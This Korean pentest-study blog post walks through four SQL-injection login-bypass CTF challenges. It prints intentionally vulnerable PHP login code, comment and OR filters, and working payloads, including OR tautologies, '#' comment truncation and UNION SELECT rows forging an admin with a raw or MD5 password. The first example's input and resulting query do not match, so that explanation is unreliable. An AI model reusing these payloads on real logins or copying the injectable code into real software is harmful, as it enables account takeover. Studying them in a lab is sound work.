---
title: 모의해킹 스터디 5주차 CTF 문제 분석 및 구현
author: leewoojin
date: 2025-05-03 00:00:00 +0900
categories: [Pentest, W5]
tags: [SQLi, 로그인우회, CTF, 웹보안]
---

> ⚠️ *본 실습 콘텐츠는 노말틱님의 해킹 스터디 CTF 문제를 기반으로 재구성하였으며, 학습 및 교육 목적에 한해 사용됩니다.*

이번 글에서는 해당 문제를 분석하고, 동일한 취약점을 기반으로 문제를 직접 구현해봄으로써, 

**SQL Injection이 로그인 로직에 어떻게 적용되고 동작하는지를 내부 구조 수준에서 심층적으로 이해**하고자 합니다.

---

##  메인 페이지

1~3주차 학습 내용을 기반으로, ChatGPT와 함께 CTF 메인 화면을 구현해봤습니다.

![CTF 메인 이미지](https://github.com/user-attachments/assets/f12dd9ea-aae6-4feb-b393-71e5dc85d3e6)
![플래그 이미지](https://github.com/user-attachments/assets/702b05d6-ab5d-4a77-9508-b4ad1191f877)

---

## 🔐 Login Bypass 1

이 문제에서는 **OR 허용**, **주석 차단**, 그리고 **식별/인증을 동시에 만족시키는 조건을 우회**하는 문제입니다.

### ✅  로그인 로직

이번 문제의 로그인 로직은 다음과 같이 구성되어 있습니다:

```php
$sql = "SELECT * FROM ctf_users1 WHERE id='$id' AND pass='$pw'";
```

> 이 구조는 사용자 입력값을 직접 쿼리에 삽입하고 있으며, `OR` 조건이 포함되어 있어 **입력값 조작만으로도 쉽게 인증 우회가 가능합니다.**

### ✅ 주석 기반 우회를 차단하는 필터링

기존 문제와 유사한 환경을 만들기 위해, `id` 입력값에서 주석 사용을 차단합니다:

```php
if (preg_match("/--|#|\/\*/i", $id)) {
  $row = false; // 강제로 로그인 실패 처리
}
```

> 📌 이렇게 하면 `'admin'#`, `'admin'--` 등의 주석 기반 우회가 차단됩니다.

### ✅ 우회 입력 예시

- **ID**: `admin1' or '1'='1`
- **PW**: (아무 값)

최종 실행되는 쿼리는 다음과 같습니다:

```sql
SELECT * FROM ctf_users1 WHERE (id='admin') OR ('1'='1' AND pass='아무거나');
```

> 이 쿼리는 ID가 DB에 존재하고, 비밀번호까지 일치할 경우에만 로그인에 성공할 수 있습니다.

![우회 입력 예시](https://github.com/user-attachments/assets/23dff875-8844-4db7-8753-3438356e1196)

## 🔐 Login Bypass 2

이 문제에서는 **OR 차단**, **주석 허용**, 그리고 **식별/인증을 동시에 만족시키는 조건을 우회**하는 문제입니다.

### ✅ 로그인 로직

`Login Bypass 1`과 동일한 SQL 쿼리가 사용됩니다:

그러나 이번 문제에서는 `OR` 키워드만 필터링하고, 주석은 허용합니다:

```php
if (preg_match("/\bor\b/i", $id) || preg_match("/\bor\b/i", $pw)) {
  $row = false; // 강제 로그인 실패
}
```

> 이렇게 하면 `' OR '1'='1`과 같은 논리 연산 기반 우회는 차단되며, `'admin'#` 또는 `'admin'--` 등 주석 기반 우회는 여전히 가능합니다.

---
### ✅ 우회 입력 예시

- **ID**: `admin'#`
- **PW**: (아무 값)

최종 실행되는 쿼리는 다음과 같습니다:

```sql
SELECT * FROM ctf_users1 WHERE id='admin'# AND pass='아무거나';
```

> `#` 주석 기호로 인해 `pass='...'` 부분이 무시되어, **ID만 일치하면 로그인 성공**합니다.

![주석 우회 예시](https://github.com/user-attachments/assets/a08df5f0-1ee8-4172-88cb-68ae6f52cf8e)

## 🔐 Login Bypass 3

이 문제에서는 **식별과 인증 로직이 분리되어 있는 구조**를 악용하여 `UNION SELECT`를 통해 **임의의 사용자 행을 결합해 인증을 우회**하는 문제입니다. 

### ✅ 로그인 로직

이번 문제의 로그인 로직은 다음과 같이 구성되어 있습니다:

```php
// 사용자 조회 (식별 단계)
$sql = "SELECT * FROM ctf_users3 WHERE id='$id'";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_array($result);

// 비밀번호 확인 (인증 단계)
if ($row && $row['pass'] === $pw) {
    // 로그인 성공
}
```

> DB 쿼리에서는 `id`만 검증하고, 비밀번호는 PHP 로직에서 비교하기 때문에,공격자가 SQL Injection을 통해 `UNION SELECT`로 위조된 사용자 정보를 주입할 수 있습니다.


### ✅ 우회 입력 예시
예를 들어 아래와 같이 입력하면:

![UNION 우회 예시](https://github.com/user-attachments/assets/1d294a3f-3f5e-4e11-b6c6-7994e7694283)

최종적으로 실행되는 SQL 쿼리는 다음과 같습니다:

```sql
SELECT * FROM ctf_users3 WHERE id='' union select 'admin', '111';
```

> WHERE id=' ' 조건이 실패한 후, UNION SELECT 'admin' , '111'으로 생성된 가짜 행이 반환되어, PHP 코드에서 row['pass'] 비교를 통해 로그인 우회가 가능합니다.


## 🔐 Login Bypass 4

이이 문제는 **Login Bypass 3**에서 사용된 `인증/식별 분리 구조`에  
**MD5 해시 기반의 비밀번호 검증**을 결합한 실습 문제입니다. 

### ✅ 로그인 로직
```php
if ($row && $row['pass'] === md5($pw)) {
    // 로그인 성공
}
```
> id는 DB에서 조회되고, pass는 PHP 코드에서 md5() 함수로 비교됩니다.

### ✅ 우회 입력 예시

<img width="469" alt="Image" src="https://github.com/user-attachments/assets/adf55651-f2b4-4626-ba4a-b957868a17c0" />

최종적으로 실행되는 SQL 쿼리는 다음과 같습니다:

```sql
SELECT * FROM ctf_users4 WHERE id='' UNION SELECT 'admin', '698d51a19d8a121ce581499d7b701668';
```
> 698d51a19d8a121ce581499d7b701668는 문자열 '111'의 MD5 해시값입니다.












